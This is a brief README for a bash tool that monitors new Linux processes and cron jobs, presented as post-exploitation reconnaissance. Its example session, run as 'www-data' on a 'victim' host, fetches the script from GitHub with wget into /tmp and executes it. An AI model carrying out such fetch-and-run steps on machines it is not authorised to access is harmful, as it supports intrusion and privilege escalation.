# Linux Monitor New Process (LMNP)

Bash script to monitor new processes and cron tasks that run at regular intervals of time.

```bash
www-data@victim:~$ cd /tmp
www-data@victim:~$ wget https://raw.githubusercontent.com/d4t4s3c/Linux-Monitor-New-Process/main/lmnp.sh
www-data@victim:~$ chmod +x lmnp.sh
www-data@victim:~$ ./lmnp.sh
```
```bash
successful results:
/bin/bash /directory/evil.sh
/bin/bash /directory/evil.py
/bin/bash -c php /directory/evil.php
```
